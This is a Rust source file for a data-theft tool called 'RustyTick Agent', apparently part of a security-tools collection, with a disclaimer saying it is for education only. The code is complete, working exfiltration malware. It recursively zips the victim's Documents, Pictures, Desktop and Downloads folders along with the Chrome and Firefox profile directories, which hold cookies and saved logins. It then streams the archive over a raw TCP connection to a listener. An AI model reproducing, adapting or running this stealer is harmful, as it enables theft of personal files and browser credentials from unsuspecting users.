// -------------------------------------------------------------------------
// SECURITY RESEARCH & EDUCATIONAL PURPOSES ONLY
// This script is part of the BugWare repository, a collection of security tools
// and PoCs for learning about attack vectors.
// DO NOT USE THIS FOR ILLEGAL PURPOSES.
// -------------------------------------------------------------------------

/*
    Program: RustyTick Agent
    Description: Rust-based data exfiltration tool designed to target and zip specific file types.
    Author: CyberPanther232
    Suite: BugWare
    Version: 1.0
*/

use std::io::{self, Read, Write};
use std::net::TcpStream;
use std::fs;
use std::path::{Path, PathBuf};
use zip::ZipWriter;
use zip::write::FileOptions;
use dirs; // Add this line to import the dirs crate

fn zip_output_path() -> PathBuf {
    let mut p = std::env::temp_dir();
    p.push("archive.zip");
    p
}

// Recursively add files from a directory, preserving structure under `label`
fn zip_dir(zip: &mut ZipWriter<fs::File>, base: &Path, label: &str) -> io::Result<()> {
    let options = FileOptions::default();
    let mut stack = vec![base.to_path_buf()];
    let mut buffer = Vec::new();

    while let Some(dir) = stack.pop() {
        for entry in fs::read_dir(&dir)? {
            let entry = entry?;
            let path = entry.path();

            if path.is_dir() {
                stack.push(path);
                continue;
            }
            if !path.is_file() {
                continue;
            }

            if let Some(ext) = path.extension().and_then(|s| s.to_str()) {
                match ext {
                    "zip" | "exe" | "dll" | "sys" | "bat" | "csv" => continue,
                    _ => {}
                }
            }

            let rel = path.strip_prefix(base).unwrap_or(&path);
            let name = Path::new(label).join(rel).to_string_lossy().into_owned();

            zip.start_file::<_, ()>(&name, options)?;
            buffer.clear();
            let mut f = fs::File::open(&path)?;
            f.read_to_end(&mut buffer)?;
            zip.write_all(&buffer)?;
        }
    }
    Ok(())
}

fn current_os() -> &'static str {
    if cfg!(target_os = "windows") {
        "windows"
    } else if cfg!(target_os = "linux") {
        "linux"
    } else if cfg!(target_os = "macos") {
        "macos"
    } else {
        "unknown"
    }
}

fn create_zip() -> io::Result<PathBuf> {
    let out_path = zip_output_path();
    let file = fs::File::create(&out_path)?;
    let mut zip = ZipWriter::new(file);

    // Use the 'dirs' crate to find home/document/etc directories safely
    let source_paths: Vec<PathBuf> = [
        dirs::document_dir(),
        dirs::picture_dir(),
        dirs::desktop_dir(),
        dirs::download_dir(),
    ]
    .iter()
    .filter_map(|path_opt| path_opt.clone()) // Remove None values and get PathBuf
    .collect();

    // Browser data paths are still OS-specific, but we can get the home dir
    if let Some(home_dir) = dirs::home_dir() {
        let current_os = current_os();
        let browser_paths: Vec<PathBuf> = match current_os {
            "windows" => vec![
                home_dir.join("AppData\\Local\\Google\\Chrome\\User Data\\Default"),
                home_dir.join("AppData\\Roaming\\Mozilla\\Firefox\\Profiles"),
            ],
            "linux" => vec![
                home_dir.join(".config/google-chrome/Default"),
                home_dir.join(".mozilla/firefox"),
            ],
            "macos" => vec![
                home_dir.join("Library/Application Support/Google/Chrome/Default"),
                home_dir.join("Library/Application Support/Firefox/Profiles"),
            ],
            _ => vec![],
        };

        for base in source_paths.iter().chain(browser_paths.iter()) {
            if base.is_dir() {
                let label = base.file_name().and_then(|s| s.to_str()).unwrap_or("root");
                zip_dir(&mut zip, base, label)?;
            }
        }
    }

    zip.finish()?;
    Ok(out_path)
}

fn main() -> io::Result<()> {
    // Create a zip file and get its path
    let zip_path = create_zip()?;
    // Connect to the server
    let mut stream = TcpStream::connect("127.0.0.1:8080")?;

    // Stream the zip file to the server
    let mut zip_file = fs::File::open(&zip_path)?;
    let mut buf = [0u8; 4096];

    loop {
        let n = zip_file.read(&mut buf)?;
        if n == 0 {
            break;
        }
        stream.write_all(&buf[..n])?;
    }

    Ok(())
}

